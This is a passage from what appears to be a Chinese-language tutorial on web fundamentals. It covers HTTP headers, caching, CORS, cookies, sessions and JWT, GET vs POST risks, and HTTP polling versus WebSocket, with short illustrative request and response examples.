<li>服务端根据 SESSION_ID 找到登录用户信息。</li>
</ul>
</li>
<li><strong>使用 Authorization 的情况（通常配合 JWT）</strong>：
<ul>
<li>用户登录后，服务端返回一个 JWT Token：</li>
<li><code>Authorization: Bearer eyJhbGciOi...</code></li>
<li>客户端存储该 Token（如存在 localStorage）</li>
<li>每次请求手动添加请求头：</li>
<li><code>Authorization: Bearer eyJhbGciOi...</code></li>
</ul>
</li>
</ul>
<p>✅ <strong>区别总结</strong>：</p>
<ul>
<li>Cookie 自动携带，适合传统 Web；</li>
<li>Authorization 自主控制，更适合前后端分离项目。</li>
</ul>
<h3 id="✅-2-前端缓存控制——静态资源访问场景">✅ 2. 前端缓存控制——静态资源访问场景</h3>
<p><strong>情景</strong>：用户首次访问某网站首页，加载静态资源（如 <code>logo.png</code>）</p>
<ul>
<li><strong>强缓存</strong>（不发请求）： 服务端返回响应头：</li>
<li><code>Cache-Control: max-age=3600</code></li>
<li>浏览器 1 小时内再次访问 <code>logo.png</code>，<strong>直接从本地缓存获取</strong>，不会发请求。</li>
<li><strong>协商缓存</strong>（发请求，但可能不下载）： 首次访问响应头：</li>
<li><code>ETag: &quot;img-v1&quot;   ``Last-Modified: Wed, 18 May 2025 10:00:00 GMT</code></li>
<li>第二次访问时，请求头中携带：</li>
<li><code>If-None-Match: &quot;img-v1&quot; ``If-Modified-Since: Wed, 18 May 2025 10:00:00 GMT</code></li>
<li>若资源没变，服务端返回：</li>
<li><code>304 Not Modified</code></li>
<li>浏览器使用本地缓存。</li>
</ul>
<h3 id="✅-3-CORS-实现跨域请求——前后端分离项目接口调用场景">✅ 3. CORS 实现跨域请求——前后端分离项目接口调用场景</h3>
<p><strong>情景</strong>：前端站点 <code>https://web.a.com</code> 请求后端接口 <code>https://api.b.com/user/info</code></p>
<p>由于<strong>不同源</strong>（域名不同），浏览器默认拦截。</p>
<ul>
<li>前端发起请求时带有 Origin：</li>
<li><code>Origin: https://web.a.com</code></li>
<li>服务端设置响应头允许跨域：</li>
<li><code>Access-Control-Allow-Origin: https://web.a.com</code> <code>Access-Control-Allow-Methods: GET, POST</code> <code>Access-Control-Allow-Credentials: true</code></li>
<li>若请求是带 Cookie 的，还需 <code>xhr.withCredentials = true</code>。</li>
</ul>
<p>✅ 若为复杂请求（如 Content-Type 为 application/json），浏览器还会先发一次 OPTIONS 预检请求。</p>
<h3 id="✅-4-ETag-和-Last-Modified-协商缓存——内容更新检测场景">✅ 4. ETag 和 Last-Modified 协商缓存——内容更新检测场景</h3>
<p><strong>情景</strong>：前端每次打开商品详情页，请求商品图片 <code>img-001.jpg</code></p>
<ul>
<li>首次访问响应：</li>
<li><code>ETag: &quot;img123&quot;   ``Last-Modified: Sat, 17 May 2025 12:00:00 GMT</code></li>
<li>第二次请求时：</li>
<li><code>If-None-Match: &quot;img123&quot; ``If-Modified-Since: Sat, 17 May 2025 12:00:00 GMT</code></li>
<li>若资源未更新，返回：</li>
<li><code>304 Not Modified</code></li>
</ul>
<p>⚠️ 若图片被替换了（即文件变了），ETag 也会变为新的值，浏览器重新下载新内容。</p>
<h3 id="✅-5-User-Agent-与-Referer-的安全性分析——反爬虫与-CSRF-防御场景">✅ 5. User-Agent 与 Referer 的安全性分析——反爬虫与 CSRF 防御场景</h3>
<h4 id="✅-User-Agent-防爬虫">✅ User-Agent 防爬虫</h4>
<p><strong>情景</strong>：一个抢票网站禁止爬虫频繁请求。</p>
<ul>
<li>正常浏览器 UA：</li>
<li><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...</code></li>
<li>爬虫脚本 UA（如 Python）：</li>
<li><code>User-Agent: python-requests/2.31.0</code></li>
<li>服务端可通过判断 UA 是否为常见爬虫库名，拒绝访问或加入验证码流程。</li>
</ul>
<h4 id="⚠️-Referer-泄露与风险">⚠️ Referer 泄露与风险</h4>
<p><strong>情景</strong>：用户在网页中点击链接跳转到第三方支付页面：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https:<span class="regexp">//</span>www.mysite.com<span class="regexp">/order/</span>confirm?token=xyz</span><br></pre></td></tr></table></figure>
<p>如果 URL 中携带敏感信息如 <code>token=xyz</code>，Referer 会暴露给第三方！</p>
<p>✅ 安全实践：</p>
<ul>
<li>避免在 URL 中传敏感信息；</li>
<li>对重要操作使用 Token 验证而非仅靠 Referer；</li>
<li>设置 <code>Referrer-Policy</code> 控制暴露行为。</li>
</ul>
<h2 id="TLS传输层安全协议">TLS传输层安全协议</h2>
<p>TLS（Transport Layer Security，传输层安全协议）是一个用于<strong>在网络中提供通信加密和身份认证</strong>的协议，是现代网络安全通信的基础。它是 SSL（Secure Sockets Layer）的继承版本，目前常说的“HTTPS”其实就是 “HTTP over TLS”。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmEyNDA2N2MwOGUzNjJjNGM0MjY4MDg5NjQzNDI2MTZfSVJHdlhiT0pnOTNicU5BcGE3RUJqZVZsaWMwb2F2cVlfVG9rZW46V0t3bWJLMTJpbzcyTUN4OFZJN2NXeDVibjliXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGNhYTJhMzg0NmU3NDhmYmU0MmQyMDI4YWIyNjgxNzJfaUk3V2dhQXpMY0M4QTNmZ2RsQVduU0hlN2xrWUZYdVJfVG9rZW46T05ueGJ5NWlSbzVpbU94Q1RaNGNuUjdQbjBnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="HTTP-1-0-、HTTP-1-1缓存机制">HTTP/1.0 、HTTP/1.1缓存机制</h2>
<h2 id="✅-HTTP-1-0-缓存机制详解">✅ HTTP/1.0 缓存机制详解</h2>
<h3 id="🎯-核心字段">🎯 核心字段</h3>
<ul>
<li><code>Expires</code>（响应头）：标记资源的<strong>过期时间</strong>，在该时间前，客户端可以使用本地缓存。</li>
<li><code>Last-Modified</code>（响应头）：资源在服务端<strong>最后修改的时间</strong>。</li>
<li><code>If-Modified-Since</code>（请求头）：浏览器带上这个时间问服务器：资源有没有被修改过？</li>
</ul>
<h3 id="🧠-缓存的两种策略">🧠 缓存的两种策略</h3>
<h4 id="✅-1-强缓存（强制使用本地缓存，不请求服务器）">✅ 1. 强缓存（强制使用本地缓存，不请求服务器）</h4>
<p>使用字段：<code>Expires</code></p>
<h4 id="✅-2-协商缓存（先问服务器有没有更新）">✅ 2. 协商缓存（先问服务器有没有更新）</h4>
<p>使用字段：<code>Last-Modified</code> + <code>If-Modified-Since</code></p>
<h2 id="✅-举个例子">✅ 举个例子</h2>
<blockquote>
<p>假设你第一次访问一个图片 <code>logo.png</code>。</p>
</blockquote>
<h3 id="🔁-第一次请求（没有缓存）">🔁 第一次请求（没有缓存）</h3>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/images/logo.png</span> <span class="meta">HTTP/1.0</span></span><br></pre></td></tr></table></figure>
<p><strong>服务器响应：</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">0</span> <span class="number">200</span> OK ``Expires: Wed, <span class="number">22</span> May <span class="number">2025</span> <span class="number">15</span>:<span class="number">00</span>:<span class="number">00</span> GMT ``Last-Modified: Wed, <span class="number">22</span> May <span class="number">2025</span> <span class="number">13</span>:<span class="number">00</span>:<span class="number">00</span> GMT ``...图片内容...</span><br></pre></td></tr></table></figure>
<p>客户端会：</p>
<ul>
<li>缓存这张图片。</li>
<li>记录下：
<ul>
<li>过期时间：<code>Expires</code></li>
<li>最后修改时间：<code>Last-Modified</code></li>
</ul>
</li>
</ul>
<h3 id="🔁-第二次请求（5分钟后发起）">🔁 第二次请求（5分钟后发起）</h3>
<h4 id="情况一：当前时间-Expires">情况一：当前时间 &lt; Expires</h4>
<p>客户端直接使用本地缓存，不发请求，属于 <strong>强缓存</strong>，<strong>连服务器都不问</strong>。</p>
<h4 id="情况二：当前时间-Expires">情况二：当前时间 &gt; Expires</h4>
<p>客户端发送带有 <code>If-Modified-Since</code> 的请求（协商缓存）：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /images/logo.png HTTP/<span class="number">1</span>.<span class="number">0</span> ``If-Modified-Since: Wed, <span class="number">22</span> May <span class="number">2025</span> <span class="number">13</span>:<span class="number">00</span>:<span class="number">00</span> GMT</span><br></pre></td></tr></table></figure>
<p><strong>服务器会检查：</strong></p>
<ul>
<li>如果资源没有改动：</li>
<li><code>HTTP/1.0 304 Not Modified</code>
<ul>
<li>浏览器使用本地缓存（节省带宽）。</li>
</ul>
</li>
<li>如果资源改动了（比如文件被重新上传）：</li>
<li><code>HTTP/1.0 200 OK ``Last-Modified: Wed, 22 May 2025 14:00:00 GMT ``...新内容...</code>
<ul>
<li>浏览器更新缓存。</li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Nzg2NzQzNTAxMmNmY2JjZTM5MDgwNTQyNDVhOGVjMmZfTXhkWTJOSVJObjFZYzJ0WXZqM0lnODdjUG85b0JSMURfVG9rZW46V0ZsbWJNd2Zjb2RjUnN4RE1jZmMxVmI3bkxkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjQ5NzE5YzQzMTYwZmVhZTgxMWZkMzBlNGE4NzZiNjBfaVlVRERQOExsS1pnWk1lN0E3cjlMZkprWm9QdnJuV2hfVG9rZW46VG1sQWJXUnRxb2hDUDh4TDJjQ2MyRGplbnliXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="二、🧠-协商缓存机制（向服务器确认资源是否更新）">二、🧠 协商缓存机制（向服务器确认资源是否更新）</h2>
<h3 id="🎯-核心字段：">🎯 核心字段：</h3>
<h3 id="✅-ETag（实体标签）是资源的唯一标识符（比如文件的哈希值）">✅ <code>ETag</code>（实体标签）是资源的唯一标识符（比如文件的哈希值）</h3>
<h4 id="例子：第一次请求">例子：第一次请求</h4>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/logo.png</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
<p>响应头：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK <span class="string">``</span>ETag: <span class="string">&quot;abc123&quot;</span><span class="string">``</span> <span class="string">``</span><span class="keyword">Cache</span><span class="params">-Control</span>: no<span class="params">-cache</span></span><br></pre></td></tr></table></figure>
<p>浏览器将：</p>
<ul>
<li>缓存资源</li>
<li>保存 ETag <code>&quot;abc123&quot;</code></li>
</ul>
<h4 id="例子：第二次请求">例子：第二次请求</h4>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="symbol">/logo.png</span> HTTP<span class="symbol">/1.1</span> ``<span class="params">If-None-Match:</span> <span class="string">&quot;abc123&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>两种情况：</strong></p>
<ul>
<li>如果资源没变：</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">304</span> Not Modified</span><br></pre></td></tr></table></figure>
<blockquote>
<p>浏览器使用本地缓存的资源，减少传输流量。</p>
</blockquote>
<ul>
<li>如果资源已变：</li>
</ul>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK <span class="string">``</span>ETag: <span class="string">&quot;xyz456&quot;</span><span class="string">``</span> <span class="string">``</span><span class="params">...</span>新的资源内容<span class="params">...</span></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzNmODEwMzFkYWI5NGFhMGEzYjQ3YzYxM2RjYjg4NzZfTGxkUkc5U29GSkpkVU9HNU1IcDJQTlpCcVdCV1NYT1NfVG9rZW46RVNRT2JPYjFVb3I2NTV4UXF6RGNIeTRobkViXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="cookie、session、jwt、token">cookie、session、jwt、token</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjcxYjQ5MGVlNTU2N2QwNjZkN2Y0MDc2Y2NkZWE3MGNfa1MydDhvZmwyUGV4NUxSZG00UXRSV2ZmeHNJR3I4SHZfVG9rZW46R1dNM2JZS0Yyb2tZOUV4T1dYWWNiem9XblZ4XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="📦-一、Cookie-示例与流程">📦 一、Cookie 示例与流程</h2>
<h3 id="🧭-场景：">🧭 场景：</h3>
<p>用户访问 <code>https://a.com/login</code> 登录成功。</p>
<h3 id="✅-流程：">✅ 流程：</h3>
<ol>
<li>用户输入账号密码提交给服务器。</li>
<li>服务器验证成功后，<strong>在响应头中添加：****<code>Set-Cookie: uid=12345; Path=/; HttpOnly</code></strong></li>
<li>浏览器收到后，自动将 Cookie 存储。</li>
<li>后续用户访问 <code>https://a.com/home</code>，浏览器自动携带：<code>Cookie: uid=12345</code></li>
<li>服务器解析 Cookie，识别用户身份。</li>
</ol>
<h3 id="⚖️-优缺点：">⚖️ 优缺点：</h3>
<ul>
<li>✅ 优点：自动管理、兼容性好、配合 Session 使用广泛。</li>
<li>❌ 缺点：不安全（可伪造）、体积小（4KB 限制）、同源限制。</li>
</ul>
<h2 id="🎯-二、Session-示例与流程">🎯 二、Session 示例与流程</h2>
<h3 id="🧭-场景：-2">🧭 场景：</h3>
<p>用户访问 <code>https://b.com/login</code> 登录。</p>
<h3 id="✅-流程：-2">✅ 流程：</h3>
<ol>
<li>登录成功后，<strong>服务器生成一个唯一的 session_id = abc123</strong></li>
<li>服务器将用户信息保存在内存中，如 <code>session['abc123'] = &#123;uid: 101, name: 'Tom'&#125;</code>。</li>
<li>响应中附带 <code>Set-Cookie: session_id=abc123</code></li>
<li>后续访问时，浏览器自动携带 <code>Cookie: session_id=abc123</code>，服务器据此查询 Session 数据。</li>
</ol>
<h3 id="⚖️-优缺点：-2">⚖️ 优缺点：</h3>
<ul>
<li>✅ 优点：安全（信息保存在服务端）、支持丰富数据。</li>
<li>❌ 缺点：需要服务端维护（分布式需共享 session）、不适合移动端。</li>
</ul>
<h2 id="🧾-三、Token-示例与流程（自定义的）">🧾 三、Token 示例与流程（自定义的）</h2>
<h3 id="🧭-场景：-3">🧭 场景：</h3>
<p>移动端用户使用 App 登录。</p>
<h3 id="✅-流程：-3">✅ 流程：</h3>
<ol>
<li>登录成功，<strong>服务端生成一个随机 token = xyz987</strong></li>
<li>服务端将 token 存入 Redis：</li>
<li><code>redis.set(token, user_info, TTL=1h)</code></li>
<li>返回给客户端：<code>&#123; &quot;token&quot;: &quot;xyz987&quot; &#125;</code></li>
<li>后续客户端请求接口时：</li>
<li><code>Authorization: Bearer xyz987</code></li>
<li>服务端验证 token 是否有效，查询 Redis 获取用户身份。</li>
</ol>
<h3 id="⚖️-优缺点：-3">⚖️ 优缺点：</h3>
<ul>
<li>✅ 优点：服务端无状态（适合分布式），支持 App、H5。</li>
<li>❌ 缺点：token 一旦泄露就可伪造，需要配合 HTTPS 和过期机制。</li>
</ul>
<h2 id="🔐-四、JWT（JSON-Web-Token）">🔐 四、JWT（JSON Web Token）</h2>
<h3 id="🧭-场景：-4">🧭 场景：</h3>
<p>用户访问 <code>https://api.example.com/login</code></p>
<h3 id="✅-JWT-内容结构：">✅ JWT 内容结构：</h3>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Header</span>.Payload.Signature</span><br></pre></td></tr></table></figure>
<p>如：</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.  // Header：使用的加密算法` `eyJ1c2VySWQiOjEwMSwibmFtZSI6IlRvbSIsImV4cCI6MTY5ODAwMDAwMH0. // Payload：用户信息和过期时间` `signature // Signature：签名值（防篡改）</span><br></pre></td></tr></table></figure>
<h3 id="✅-流程：-4">✅ 流程：</h3>
<ol>
<li>登录成功后，服务器返回一个 <strong>签名后的 JWT 字符串</strong></li>
<li>客户端本地存储（如 LocalStorage）</li>
<li>后续访问接口时在请求头加上：</li>
<li><code>Authorization: Bearer xxxxxxx</code></li>
<li>服务端解密验证签名，提取用户信息，完成鉴权。</li>
</ol>
<h3 id="⚖️-优缺点：-4">⚖️ 优缺点：</h3>
<ul>
<li>✅ 优点：
<ul>
<li>无需存储，跨服务使用方便（解签即可验证身份）</li>
<li>可存放角色、权限等信息</li>
</ul>
</li>
<li>❌ 缺点：
<ul>
<li><strong>不能主动失效</strong>（例如强制登出，除非前端删除或黑名单）</li>
<li>体积大，传输性能略差</li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTNlOGRmYzE2ZGY1M2Y3ODVhYWJlODMxODA4Y2U0YWJfZG1OM203MDdTcVFsOEVwU1N2d0kzZW51Zkh4bElOZDRfVG9rZW46RmUzU2JmcTBHb0p1TXl4Yk1sUGNUSFVjbnFnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<blockquote>
<p><strong>既然 token 是“无状态”的，为什么还把 token 存到 Redis 呢？这不又变成有状态了吗？</strong></p>
</blockquote>
<h3 id="✅-先明确：JWT-Token-本身可以做到“无状态认证”">✅ 先明确：<strong>JWT Token 本身可以做到“无状态认证”</strong></h3>
<ul>
<li>它自包含了用户信息（如 userId、权限等），服务端只需要校验签名即可，不需要 Redis。</li>
<li>所以理论上你只要验证 token 的合法性就行，不用存 Redis。</li>
</ul>
<h3 id="❗那为什么很多系统仍然把-token-存-Redis？">❗那为什么很多系统仍然把 token 存 Redis？</h3>
<p>因为<strong>真实系统要考虑更多安全和业务控制场景</strong>：</p>
<h3 id="🔒-1-支持-token-主动失效（如用户注销）">🔒 1. <strong>支持 token 主动失效（如用户注销）</strong></h3>
<ul>
<li>JWT 是不可修改的，发出后如果不存 Redis，就无法强制某个 token 提前失效。</li>
<li>如果你想让用户退出登录后立即无法访问，只能把 token 放 Redis，并在每次请求时校验它是否还存在。</li>
<li>❗<strong>否则用户 JWT 虽然还没过期，但已经注销了，他依然能访问接口 → 不安全。</strong></li>
</ul>
<h3 id="⏳-2-支持服务端统一刷新-延长-token-生命周期">⏳ 2. <strong>支持服务端统一刷新 / 延长 token 生命周期</strong></h3>
<ul>
<li>把 token 存入 Redis，结合过期时间（TTL），你可以在快过期时自动刷新。</li>
</ul>
<h3 id="🧱-3-多设备登录控制、单点登录（SSO）">🧱 3. <strong>多设备登录控制、单点登录（SSO）</strong></h3>
<ul>
<li>你可以按 userId 存一组 token，方便你：
<ul>
<li>限制某个用户只能登录一个设备（踢掉旧 token）。</li>
<li>实现后台手动踢人、黑名单机制。</li>
</ul>
</li>
</ul>
<h3 id="🔁-4-配合刷新-token-机制（RefreshToken）">🔁 4. <strong>配合刷新 token 机制（RefreshToken）</strong></h3>
<ul>
<li>有些系统使用双 token 机制（AccessToken + RefreshToken），需要 Redis 来保存刷新用的 token 对象。</li>
</ul>
<h3 id="✅-总结一句话：-2">✅ 总结一句话：</h3>
<blockquote>
<p><strong>JWT token 本身是无状态的，但为了增强控制力与安全性，很多系统在服务端仍然存 Redis，实现“可控的无状态”。</strong></p>
</blockquote>
<h2 id="get和post区别">get和post区别</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MWI0MWZiNGFjZjFmMDA2YjM1ZGQxODhlZDlkYjkzNjRfMHkxYlJTQ3djd2lCbEtQR0txS252ZE5oNVlObnc3VGVfVG9rZW46V0hHUGJzSWFzb3BMZUZ4TzhQbGNqcWxZblplXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2VjYjM2MWNhZDBmMTU1MmJlOWViMGUxNTJjNzc4YWNfalZrNjg5bE1GcHhEV2hZdXdodVVzS1FhcTl1NWtMUG9fVG9rZW46WHU4dmJXRWNqb3pMSzN4VFI3MmMyTUdMbnZoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2E5ZDZjNmRkYmY3YTJkN2ExZDA5MmRmMDgzYWRkNjRfMUx6SjlsMlg1d3drNWtWamJNV1VzdldJOHJ0eFhFN0RfVG9rZW46R2Y5ZWJrUGYzb3VqMDB4NW9aZWMzY09sbmJnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🔐-安全性说明（以-GET-泄密为例）">🔐 安全性说明（以 GET 泄密为例）</h2>
<p>假如你用如下 GET 请求登录系统：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> /<span class="keyword">login</span>?username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器记录历史记录时，会记录完整 URL；</li>
<li>公司代理服务器的日志可能记录了请求；</li>
<li>用户复制地址栏链接时，可能误把密码发给别人；</li>
</ul>
<p>这就解释了为什么 GET <strong>不适合</strong>传敏感信息，尤其是密码、token、身份证号等。</p>
<h2 id="http与WebSocket">http与WebSocket</h2>
<h3 id="✅-一、HTTP-协议的不足：它是“短连接-请求响应”模型">✅ 一、HTTP 协议的<strong>不足：它是“短连接 + 请求响应”模型</strong></h3>
<p>HTTP 协议的通信模型是这样的：</p>
<ul>
<li><strong>客户端必须先发起请求，服务端才能响应。</strong></li>
<li>每次请求和响应结束，连接通常就会关闭（除非使用 <code>keep-alive</code>）。</li>
<li>如果客户端想获取最新的数据，比如新消息、股票价格，就得不断地发起请求（轮询）。</li>
</ul>
<p>🔍 举个例子：</p>
<p>你在聊天室里等朋友发消息，如果用 HTTP 协议：</p>
<ul>
<li>浏览器每隔 3 秒发送一次请求：“有新消息吗？”</li>
<li>服务器返回：“暂时没有。”</li>
<li>如此反复，占用资源，延迟高，效率低。</li>
</ul>
<h3 id="✅-二、WebSocket-的优势：建立一次连接，就能双向实时通信">✅ 二、WebSocket 的优势：建立一次连接，<strong>就能双向实时通信</strong></h3>
<p>WebSocket 是一种<strong>应用层协议</strong>，它建立在 TCP 协议之上，特点是：</p>
<ul>
<li>一次握手成功后（通过 HTTP 协议发起），就建立了一个持久连接。</li>
<li><strong>客户端和服务端都可以主动发送消息</strong>（全双工通信）。</li>
<li>不需要像 HTTP 那样请求-响应、断开重连，通信更高效。</li>
</ul>
<p>🔍 上面聊天室的例子换成 WebSocket：</p>
<ul>
<li>浏览器和服务器建立一个 WebSocket 连接；</li>
<li>当朋友发消息时，服务器会主动通过连接推送给你；</li>
<li>实时、节省资源、用户体验好。</li>
</ul>
<h3 id="✅-三、所以说这句话的含义是：">✅ 三、所以说这句话的含义是：</h3>
<blockquote>
<p>WebSocket 是应用层协议，它的出现是为了弥补 HTTP 不能满足实时双向通信的缺陷。它让<strong>客户端与服务器之间能够实时、持久地进行双向通信</strong>，而不是客户端单方面地请求、服务端单方面地响应。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NmNmZTAzYWE1YTFlZmU0N2UwMzViYmE0NTEzZGY0OWZfT1g2YzNJVDZhS243NzRLc20ySVdXbHFBczVRN2FzM2dfVG9rZW46TnJ2aWJwa1JPb0k0OFp4d0ZKOWN4eGV6bkJIXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🎯-场景设定">🎯 场景设定</h2>
<blockquote>
<p>页面展示一只股票的价格，并<strong>实时更新</strong></p>
</blockquote>
<h2 id="一、使用-HTTP-实现（轮询）">一、使用 HTTP 实现（轮询）</h2>
<h3 id="👇-客户端流程：">👇 客户端流程：</h3>
<ol>
<li>客户端打开页面。</li>
<li>每隔 5 秒发一次 HTTP 请求：</li>
<li><code>GET /stock/price?symbol=TSLA HTTP/1.1</code></li>
<li>服务端返回当前价格：</li>
<li><code>&#123; ``  &quot;symbol&quot;: &quot;TSLA&quot;, ``  &quot;price&quot;: 172.35 ``&#125;</code></li>
<li>客户端解析并更新页面价格。</li>
<li>下一轮 5 秒后继续请求……</li>
</ol>
<h3 id="❌-缺点：-4">❌ 缺点：</h3>
<ul>
<li>⏱️ <strong>延迟</strong>：最小延迟就是轮询间隔，5 秒内的变化你都看不到。</li>
<li>📶 <strong>资源浪费</strong>：即使股票价格没变，仍然发请求，占用带宽和计算资源。</li>
<li>🔁 <strong>不实时</strong>：不能满足高频变化的场景（如秒级交易系统）。</li>
</ul>
<h2 id="二、使用-WebSocket-实现（推送）">二、使用 WebSocket 实现（推送）</h2>
<h3 id="👇-客户端流程：-2">👇 客户端流程：</h3>
<ol>
<li>客户端建立 WebSocket 连接：</li>
<li><code>ws://stock.example.com/ws</code></li>
<li>服务端保持连接，<strong>主动推送</strong>价格更新：</li>
<li><code>&#123; ``  &quot;symbol&quot;: &quot;TSLA&quot;, ``  &quot;price&quot;: 172.41 ``&#125;</code></li>
<li>客户端接收到后立即更新页面，不需要发请求。</li>
<li>整个过程中连接保持活跃，一直到关闭页面或断网。</li>
</ol>
<h3 id="✅-优点：-2">✅ 优点：</h3>
<ul>
<li>🚀 <strong>实时性强</strong>：价格变化立刻推送，几乎无延迟。</li>
<li>✅ <strong>低资源占用</strong>：只发有用数据，避免无意义请求。</li>
<li>🔄 <strong>双向通信</strong>：客户端也可以主动发消息给服务端（如订阅/取消订阅）。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MGVlOGQ3MDA1NGNmOTkwYzY4NmE2MjA0MzBmYzcyZGVfdWd6UldpVldtUm5yeTVwRHI1TVZOU0FUT29Wc0NMTktfVG9rZW46WHRmNGJUWk9wbzhWM3p4UnRtcmNuWWtqblpiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-一、断线重连">✅ 一、断线重连</h2>
<h3 id="🎯-场景说明">🎯 场景说明</h3>
<p>用户因为网络波动、后端服务重启等原因导致 WebSocket 连接断开。</p>
<h3 id="💡-实现方案">💡 实现方案</h3>
<ul>
<li>在客户端监听 <code>onclose</code> 和 <code>onerror</code> 事件；</li>
<li>使用定时器按 <strong>指数退避</strong>方式尝试 <code>new WebSocket(url)</code> 重新连接；</li>
<li>携带 <code>sessionId</code> 或 <code>userId</code> 参数，用于服务端识别是否是“老用户”。</li>
</ul>
<h3 id="📌-注意：">📌 <strong>注意：</strong></h3>
<p>如果是<strong>用户手动断开</strong>，不应该触发自动重连；可通过设置 <code>manualClose = true</code> 标志位控制。</p>
<h3 id="📌-示例">📌 示例</h3>
